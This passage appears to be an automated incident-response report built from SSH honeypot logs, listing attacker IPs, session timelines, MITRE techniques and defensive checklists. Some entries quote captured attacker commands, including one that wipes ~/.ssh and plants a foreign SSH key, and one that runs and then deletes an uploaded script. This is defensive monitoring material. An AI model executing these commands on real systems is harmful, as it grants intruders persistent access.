| **Last Seen** | 2026-07-12 13:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:05:55` | `cowrie.session.connect` |
| `2026-07-12 13:05:56` | `cowrie.client.version` |
| `2026-07-12 13:05:56` | `cowrie.client.kex` |
| `2026-07-12 13:05:58` | `cowrie.login.success` |
| `2026-07-12 13:05:59` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]145` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62ee56b9d28

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-12 13:08 |
| **Last Seen** | 2026-07-12 13:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:08:26` | `cowrie.session.connect` |
| `2026-07-12 13:08:26` | `cowrie.client.version` |
| `2026-07-12 13:08:26` | `cowrie.client.kex` |
| `2026-07-12 13:08:26` | `cowrie.login.success` |
| `2026-07-12 13:08:27` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:08:27` | `cowrie.direct-tcpip.data` |
| `2026-07-12 13:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df0dd4928943

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-12 13:10 |
| **Last Seen** | 2026-07-12 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:10:21` | `cowrie.session.connect` |
| `2026-07-12 13:10:21` | `cowrie.client.version` |
| `2026-07-12 13:10:21` | `cowrie.client.kex` |
| `2026-07-12 13:10:22` | `cowrie.login.success` |
| `2026-07-12 13:10:22` | `cowrie.session.params` |
| `2026-07-12 13:10:22` | `cowrie.command.input` |
| `2026-07-12 13:10:23` | `cowrie.log.closed` |
| `2026-07-12 13:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c3813be90bf

| Field | Detail |
|---|---|
| **Source IP** | `217.128.120[.]43` |
| **First Seen** | 2026-07-12 13:17 |
| **Last Seen** | 2026-07-12 13:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:17:12` | `cowrie.session.connect` |
| `2026-07-12 13:17:12` | `cowrie.client.version` |
| `2026-07-12 13:17:12` | `cowrie.client.kex` |
| `2026-07-12 13:17:13` | `cowrie.login.success` |
| `2026-07-12 13:17:14` | `cowrie.session.params` |
| `2026-07-12 13:17:14` | `cowrie.command.input` |
| `2026-07-12 13:17:14` | `cowrie.command.failed` |
| `2026-07-12 13:17:14` | `cowrie.log.closed` |
| `2026-07-12 13:17:15` | `cowrie.session.params` |
| `2026-07-12 13:17:15` | `cowrie.command.input` |
| `2026-07-12 13:17:15` | `cowrie.session.file_download` |
| `2026-07-12 13:17:15` | `cowrie.log.closed` |
| `2026-07-12 13:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.128.120[.]43` to AbuseIPDB if not already reported
- [ ] Block `217.128.120[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62c14d3d4db3

| Field | Detail |
|---|---|
| **Source IP** | `217.128.120[.]43` |
| **First Seen** | 2026-07-12 13:17 |
| **Last Seen** | 2026-07-12 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:17:15` | `cowrie.session.connect` |
| `2026-07-12 13:17:15` | `cowrie.client.version` |
| `2026-07-12 13:17:15` | `cowrie.client.kex` |
| `2026-07-12 13:17:15` | `cowrie.login.success` |
| `2026-07-12 13:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.128.120[.]43` to AbuseIPDB if not already reported
- [ ] Block `217.128.120[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da57d84c65a7

| Field | Detail |
|---|---|
| **Source IP** | `217.128.120[.]43` |
| **First Seen** | 2026-07-12 13:17 |
| **Last Seen** | 2026-07-12 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:17:16` | `cowrie.session.connect` |
| `2026-07-12 13:17:16` | `cowrie.client.version` |
| `2026-07-12 13:17:16` | `cowrie.client.kex` |
| `2026-07-12 13:17:16` | `cowrie.login.success` |
| `2026-07-12 13:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.128.120[.]43` to AbuseIPDB if not already reported
- [ ] Block `217.128.120[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56cb928b7826

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-12 13:19 |
| **Last Seen** | 2026-07-12 13:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:19:01` | `cowrie.session.connect` |
| `2026-07-12 13:19:01` | `cowrie.client.version` |
| `2026-07-12 13:19:01` | `cowrie.client.kex` |
| `2026-07-12 13:19:02` | `cowrie.login.success` |
| `2026-07-12 13:19:03` | `cowrie.session.params` |
| `2026-07-12 13:19:03` | `cowrie.command.input` |
| `2026-07-12 13:19:03` | `cowrie.log.closed` |
| `2026-07-12 13:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7159f931d48f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 13:20 |
| **Last Seen** | 2026-07-12 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:20:41` | `cowrie.session.connect` |
| `2026-07-12 13:20:41` | `cowrie.client.version` |
| `2026-07-12 13:20:41` | `cowrie.client.kex` |
| `2026-07-12 13:20:42` | `cowrie.login.success` |
| `2026-07-12 13:20:43` | `cowrie.session.params` |
| `2026-07-12 13:20:43` | `cowrie.command.input` |
| `2026-07-12 13:20:43` | `cowrie.log.closed` |
| `2026-07-12 13:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76fabe39fd4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.7[.]189` |
| **First Seen** | 2026-07-12 13:22 |
| **Last Seen** | 2026-07-12 13:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:22:37` | `cowrie.session.connect` |
| `2026-07-12 13:22:38` | `cowrie.client.version` |
| `2026-07-12 13:22:38` | `cowrie.client.kex` |
| `2026-07-12 13:22:40` | `cowrie.login.success` |
| `2026-07-12 13:22:40` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.7[.]189` to AbuseIPDB if not already reported
- [ ] Block `111.70.7[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe74ecfc35ff

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-07-12 13:22 |
| **Last Seen** | 2026-07-12 13:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:22:50` | `cowrie.session.connect` |
| `2026-07-12 13:22:51` | `cowrie.client.version` |
| `2026-07-12 13:22:51` | `cowrie.client.kex` |
| `2026-07-12 13:22:53` | `cowrie.login.success` |
| `2026-07-12 13:22:56` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2f38813e3bf

| Field | Detail |
|---|---|
| **Source IP** | `192.140.185[.]8` |
| **First Seen** | 2026-07-12 13:27 |
| **Last Seen** | 2026-07-12 13:31 |
| **Session Duration** | 251s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:27:41` | `cowrie.session.connect` |
| `2026-07-12 13:27:41` | `cowrie.client.version` |
| `2026-07-12 13:27:41` | `cowrie.client.kex` |
| `2026-07-12 13:27:42` | `cowrie.login.success` |
| `2026-07-12 13:27:44` | `cowrie.session.params` |
| `2026-07-12 13:27:44` | `cowrie.command.input` |
| `2026-07-12 13:27:44` | `cowrie.command.failed` |
| `2026-07-12 13:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.140.185[.]8` to AbuseIPDB if not already reported
- [ ] Block `192.140.185[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e966abdc120e

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]84` |
| **First Seen** | 2026-07-12 13:31 |
| **Last Seen** | 2026-07-12 13:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:31:00` | `cowrie.session.connect` |
| `2026-07-12 13:31:00` | `cowrie.client.version` |
| `2026-07-12 13:31:00` | `cowrie.client.kex` |
| `2026-07-12 13:31:01` | `cowrie.login.success` |
| `2026-07-12 13:31:01` | `cowrie.session.params` |
| `2026-07-12 13:31:01` | `cowrie.command.input` |
| `2026-07-12 13:31:01` | `cowrie.command.failed` |
| `2026-07-12 13:31:02` | `cowrie.log.closed` |
| `2026-07-12 13:31:02` | `cowrie.session.params` |
| `2026-07-12 13:31:02` | `cowrie.command.input` |
| `2026-07-12 13:31:02` | `cowrie.session.file_download` |
| `2026-07-12 13:31:02` | `cowrie.log.closed` |
| `2026-07-12 13:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]84` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9a089b75e9

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]84` |
| **First Seen** | 2026-07-12 13:31 |
| **Last Seen** | 2026-07-12 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:31:02` | `cowrie.session.connect` |
| `2026-07-12 13:31:02` | `cowrie.client.version` |
| `2026-07-12 13:31:03` | `cowrie.client.kex` |
| `2026-07-12 13:31:03` | `cowrie.login.success` |
| `2026-07-12 13:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]84` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efba6a623ad9

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]84` |
| **First Seen** | 2026-07-12 13:31 |
| **Last Seen** | 2026-07-12 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:31:03` | `cowrie.session.connect` |
| `2026-07-12 13:31:03` | `cowrie.client.version` |
| `2026-07-12 13:31:03` | `cowrie.client.kex` |
| `2026-07-12 13:31:04` | `cowrie.login.success` |
| `2026-07-12 13:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]84` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ff1dc115bc3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 13:35 |
| **Last Seen** | 2026-07-12 13:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:35:05` | `cowrie.session.connect` |
| `2026-07-12 13:35:06` | `cowrie.client.version` |
| `2026-07-12 13:35:06` | `cowrie.client.kex` |
| `2026-07-12 13:35:09` | `cowrie.login.success` |
| `2026-07-12 13:35:10` | `cowrie.session.params` |
| `2026-07-12 13:35:10` | `cowrie.command.input` |
| `2026-07-12 13:35:10` | `cowrie.log.closed` |
| `2026-07-12 13:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb6ad98e098

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-07-12 13:48 |
| **Last Seen** | 2026-07-12 13:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:48:03` | `cowrie.session.connect` |
| `2026-07-12 13:48:03` | `cowrie.client.version` |
| `2026-07-12 13:48:03` | `cowrie.client.kex` |
| `2026-07-12 13:48:05` | `cowrie.login.success` |
| `2026-07-12 13:48:06` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87aae5eb0da3

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-12 13:48 |
| **Last Seen** | 2026-07-12 13:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:48:11` | `cowrie.session.connect` |
| `2026-07-12 13:48:11` | `cowrie.client.version` |
| `2026-07-12 13:48:11` | `cowrie.client.kex` |
| `2026-07-12 13:48:12` | `cowrie.login.success` |
| `2026-07-12 13:48:12` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d51a6863f97

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 13:55 |
| **Last Seen** | 2026-07-12 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:55:04` | `cowrie.session.connect` |
| `2026-07-12 13:55:04` | `cowrie.client.version` |
| `2026-07-12 13:55:04` | `cowrie.client.kex` |
| `2026-07-12 13:55:05` | `cowrie.login.success` |
| `2026-07-12 13:55:06` | `cowrie.session.params` |
| `2026-07-12 13:55:06` | `cowrie.command.input` |
| `2026-07-12 13:55:06` | `cowrie.log.closed` |
| `2026-07-12 13:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd51ed2c9354

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-07-12 13:57 |
| **Last Seen** | 2026-07-12 13:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:57:00` | `cowrie.session.connect` |
| `2026-07-12 13:57:00` | `cowrie.client.version` |
| `2026-07-12 13:57:01` | `cowrie.client.kex` |
| `2026-07-12 13:57:03` | `cowrie.login.success` |
| `2026-07-12 13:57:04` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54aba93d3eb

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-12 13:57 |
| **Last Seen** | 2026-07-12 13:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:57:09` | `cowrie.session.connect` |
| `2026-07-12 13:57:09` | `cowrie.client.version` |
| `2026-07-12 13:57:09` | `cowrie.client.kex` |
| `2026-07-12 13:57:10` | `cowrie.login.success` |
| `2026-07-12 13:57:11` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c1131e80c5

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-12 14:00 |
| **Last Seen** | 2026-07-12 14:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:00:07` | `cowrie.session.connect` |
| `2026-07-12 14:00:07` | `cowrie.client.version` |
| `2026-07-12 14:00:07` | `cowrie.client.kex` |
| `2026-07-12 14:00:08` | `cowrie.login.success` |
| `2026-07-12 14:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77693f25ace

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-12 14:00 |
| **Last Seen** | 2026-07-12 14:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:00:10` | `cowrie.session.connect` |
| `2026-07-12 14:00:10` | `cowrie.client.version` |
| `2026-07-12 14:00:10` | `cowrie.client.kex` |
| `2026-07-12 14:00:10` | `cowrie.login.success` |
| `2026-07-12 14:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-303aafb110d2

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-12 14:00 |
| **Last Seen** | 2026-07-12 14:02 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:00:26` | `cowrie.session.connect` |
| `2026-07-12 14:00:26` | `cowrie.client.version` |
| `2026-07-12 14:00:26` | `cowrie.client.kex` |
| `2026-07-12 14:00:26` | `cowrie.login.success` |
| `2026-07-12 14:00:27` | `cowrie.session.file_upload` |
| `2026-07-12 14:00:28` | `cowrie.session.params` |
| `2026-07-12 14:00:28` | `cowrie.command.input` |
| `2026-07-12 14:00:28` | `cowrie.command.input` |
| `2026-07-12 14:00:28` | `cowrie.command.input` |
| `2026-07-12 14:00:28` | `cowrie.command.failed` |
| `2026-07-12 14:00:28` | `cowrie.log.closed` |
| `2026-07-12 14:00:29` | `cowrie.session.params` |
| `2026-07-12 14:00:29` | `cowrie.command.input` |
| `2026-07-12 14:00:29` | `cowrie.log.closed` |
| `2026-07-12 14:00:30` | `cowrie.session.params` |
| `2026-07-12 14:00:30` | `cowrie.command.input` |
| `2026-07-12 14:00:30` | `cowrie.log.closed` |
| `2026-07-12 14:00:31` | `cowrie.session.params` |
| `2026-07-12 14:00:31` | `cowrie.command.input` |
| `2026-07-12 14:00:31` | `cowrie.command.failed` |
| `2026-07-12 14:00:31` | `cowrie.command.failed` |
| `2026-07-12 14:01:31` | `cowrie.session.params` |
| `2026-07-12 14:01:31` | `cowrie.command.input` |
| `2026-07-12 14:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c8a48466b8a

| Field | Detail |
|---|---|
| **Source IP** | `181.114.93[.]153` |
| **First Seen** | 2026-07-12 14:08 |
| **Last Seen** | 2026-07-12 14:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:08:30` | `cowrie.session.connect` |
| `2026-07-12 14:08:31` | `cowrie.client.version` |
| `2026-07-12 14:08:31` | `cowrie.client.kex` |
| `2026-07-12 14:08:33` | `cowrie.login.success` |
| `2026-07-12 14:08:33` | `cowrie.direct-tcpip.request` |
